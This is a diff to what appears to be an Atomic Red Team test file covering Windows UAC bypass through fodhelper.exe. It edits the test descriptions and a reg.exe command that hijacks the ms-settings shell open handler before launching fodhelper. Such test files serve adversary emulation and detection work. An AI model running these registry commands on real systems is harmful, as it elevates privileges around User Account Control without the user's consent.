@@ -47,7 +47,7 @@ atomic_tests:
 - name: Bypass UAC using Fodhelper
   description: |
     Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
-    Upon execution, "The operation completed successfully." will be shown twice and command prompt will be opened.
+
   supported_platforms:
     - windows
 
@@ -62,7 +62,7 @@ atomic_tests:
     elevation_required: false
     command: |
       reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
-      reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+      reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
       fodhelper.exe
     cleanup_command: |
       reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
@@ -70,7 +70,7 @@ atomic_tests:
 - name: Bypass UAC using Fodhelper - PowerShell
   description: |
     PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
-    Upon execution command prompt will be opened.
+
   supported_platforms:
     - windows
 
